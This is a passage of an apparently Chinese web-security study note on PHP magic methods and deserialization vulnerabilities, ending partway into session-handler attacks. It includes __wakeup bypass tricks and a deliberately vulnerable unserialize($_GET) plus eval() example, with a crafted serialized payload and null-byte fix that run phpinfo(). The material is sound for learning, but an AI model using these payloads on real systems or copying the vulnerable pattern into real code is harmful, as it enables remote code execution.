<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call xxx,a</span><br></pre></td></tr></table></figure>

<p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 <strong>self</strong>，<strong>parent</strong> 和 <strong>static</strong>）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p>
<hr>
<h4 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h4><p>读取不可访问属性的值时，<code>__get()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var2</span><br></pre></td></tr></table></figure>

<p><code>__get</code>魔术方法需要一个参数，这个参数代表着访问不存在的属性值。</p>
<hr>
<h4 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h4><p>给不可访问属性赋值时，<code>__set()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var2,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>set</strong>跟<strong>get</strong>相反，一个是访问不存在的属性，一个是给不存在的属性赋值。</p>
<hr>
<p>__isset</p>
<p>对<strong>不可访问属性</strong>（比如private的属性）调用 <strong>isset()</strong> 或 <strong>empty()</strong> 时，<code>__isset()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure>

<p>该魔术方法使用了<strong>isset()<strong>或者</strong>empty()<strong>只要属性是</strong>private</strong>或者不存在的都会触发。</p>
<hr>
<h4 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h4><p>对不可访问属性调用 <strong>unset()</strong> 时，**__unset()** 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure>

<p>如果一个类定义了魔术方法 <code>__unset()</code> ，那么我们就可以使用 <strong>unset()</strong> 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。</p>
<hr>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h4><p><strong>serialize()</strong> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重载序列化调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到执行序列化之前会先执行<strong>sleep()函数，上面</strong>sleep的函数作用是过滤掉password的变量值。</p>
<hr>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><p>unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源。</p>
<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义反序列化后调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>#1 (4) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nickname</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$order</span> =&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到执行反序列化之前会先执行<strong>wakeup()函数，上面</strong>wakeup的函数作用是将username的变量值赋值给password变量。</p>
<hr>
<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h4><p><strong>__toString()</strong> 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__toString test</span><br></pre></td></tr></table></figure>

<p>特别注意__toString的触发条件，引用k0rz3n师傅的笔记：</p>
<blockquote>
<p>(1)echo ($obj) &#x2F; print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候</p>
</blockquote>
<hr>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h4><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。(本特性只在 PHP 5.1.0 及以上版本有效。)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>();</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__invoke test</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="clone"><a href="#clone" class="headerlink" title="__clone"></a>__clone</h4><p>当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 <code>__clone()</code> ，如果该魔术方法存在的话。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__clone test</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="wakeup-函数绕过漏洞原理"><a href="#wakeup-函数绕过漏洞原理" class="headerlink" title="__wakeup()函数绕过漏洞原理"></a>__wakeup()函数绕过漏洞原理</h3><h4 id="1-低版本的php"><a href="#1-低版本的php" class="headerlink" title="1.低版本的php"></a>1.低版本的php</h4><blockquote>
<p><code>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>
<p><code>从而绕过了__wakeup()函数</code></p>
</blockquote>
<h4 id="2-高一些的版本"><a href="#2-高一些的版本" class="headerlink" title="2.高一些的版本"></a>2.高一些的版本</h4><p>举个例子，</p>
<blockquote>
<p><code>C:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
</blockquote>
<p>关键是把<code>O:</code>改成<code>C:</code>，</p>
<p><strong>原理是</strong></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">C:</span>代表这个类实现了serializeable接口，而serializeable不支持__wakeup，就绕过去了</span><br></pre></td></tr></table></figure>

<h3 id="popchain"><a href="#popchain" class="headerlink" title="*popchain"></a>*popchain</h3><blockquote>
<p>实际环境中不可能存在直接反序列化就能实现命令执行的情况，这个时候就要用到我们刚学到的一些<code>魔术方法</code>的相互触发，来构造一条popchain，从反序列化接口开始，<strong>一级一级的触发</strong>【所以就需要清楚各个魔术方法的触发情况】，最终到达我们目的想要执行的<code>方法/函数</code></p>
</blockquote>
<hr>
<h3 id="个人-一些文章对-php反序列化的一些认知"><a href="#个人-一些文章对-php反序列化的一些认知" class="headerlink" title="*个人+一些文章对 php反序列化的一些认知"></a>*个人+一些文章对 php反序列化的一些认知</h3><p>举例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>正常实例化后会执行<code>normal</code>类里面的<code>action</code>方法，但是<code>unserialize</code>函数是可控的，我们就可以对其进行攻击，思路就是改变<code>index</code>类里面<code>test</code>属性的值，让它实例化<code>evil</code>类，从而执行<code>evil</code>里面的<code>action</code>方法，同时我们也要修改<code>evil</code>类里面的<code>test2</code>属性的值</p>
<hr>
<p>因为<code>类不同于函数</code>，<code>定义完之后无法直接使用</code>，因为类<code>只是一个抽象的概念</code>，<u><strong>需要通过关键字new来实例化类，才可以使用</strong></u>。类实例化的语法格式如下：<strong>变量名&#x3D;new 类名（[构造函数]）</strong>。</p>
<p>其中，变量名可以为<strong>任何PHP变量的名称</strong>，构造参数取决于<strong>类的构造函数</strong>，若<strong>无构造函数，则圆括号中为空</strong>。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">实例化一个类后即可使用该类</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>这里反序化的，先是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br></pre></td></tr></table></figure>

<p>实例化index()类，然后调动其<code>test</code>变量实例化<code>evil)()</code>，</p>
<p>使其能够被调用，然后根据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br></pre></td></tr></table></figure>

<p>我们对<code>test2</code>变量进行赋值命令语句，使得我们可以利用其中的<code>eval</code>函数，执行一些命令来拿到我们所需要的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>最后对序列化的<strong>入口类</strong>(<code>index.php</code>)序列化，然后把序列化结果导入，再由源码中反序列化函数后，从而实现我们想要的结构</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>比如这里就是以<code>GET</code>方式传参<code>test</code>参数，</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">url/?<span class="attribute">test</span>=序列化结果</span><br></pre></td></tr></table></figure>

<p><strong>但是序列化的结果未必都是没有问题的，因为<code>%00</code>这个空字符是无法显示，只能输入进去</strong></p>
<p>以上面为例子，序列化后结果为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;indextest&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果用了这个是会报错的，</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220927091524021.png"><img src="/Web-study/image-20220927091524021.png" alt="image-20220927091524021"></a></p>
<p>因为这里的参数有问题</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">s:11</span>:<span class="string">&quot;indextest&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们仔细看一下属性值是<code>11</code>，但是后面的<code>indextest</code>总共是<code>9</code>个字符，所以丢失了两个字符，这两个字符就是空字符<code>%00</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;index%00test%00&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们加上后再试试</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220927091556911.png"><img src="/Web-study/image-20220927091556911.png" alt="image-20220927091556911"></a></p>
<p>就实现了我们的目的操作</p>
<p>当然其实还可能有的情况后面不是<code>eval()</code>的命令执行，可能是文件包含，或者其他操作，按这种思路走大都是没有问题的</p>
<h3 id="session的反序列化漏洞"><a href="#session的反序列化漏洞" class="headerlink" title="session的反序列化漏洞"></a>session的反序列化漏洞</h3><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">session的反序列化漏洞，就是利用`php`处理器和`php_serialize`处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</span><br></pre></td></tr></table></figure>



<h4 id="PHP-session序列化机制"><a href="#PHP-session序列化机制" class="headerlink" title="PHP session序列化机制"></a>PHP session序列化机制</h4><p>根据<code>php.ini</code>中的配置项，我们研究将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th align="center">处理器</th>
<th align="center">对应的存储格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php</td>
<td align="center">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php_binary</td>
<td align="center">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php_serialize (php&gt;&#x3D;5.5.4)</td>
<td align="center">经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody></table>
<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p>首先来看看默认<code>session.serialize_handler = php</code>时候的序列化结果，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="https://image.3001.net/images/20220311/1646988663_622b0d779748192aba6f7.png!small"><img src="https://image.3001.net/images/20220311/1646988663_622b0d779748192aba6f7.png!small" alt="img"></a></p>
<p>为了方便查看，将<code>session</code>存储目录设置为<code>session.save_path = &quot;/www/php_session&quot;</code>，<code>PHPSESSID</code>文件如下</p>
<p>1、文件名</p>
<p>文件名为<code>sess_mpnnbont606f50eb178na451od</code>，其中<code>mpnnbont606f50eb178na451od</code>就是后续请求头中<code>Cookie</code>携带的<code>PHPSESSID</code>的值 (如上图浏览器中已存储)</p>
<p>2、文件内容</p>
<p>php处理器存储格式</p>
<table>
<thead>
<tr>
<th align="center">键名</th>
<th align="center">竖线</th>
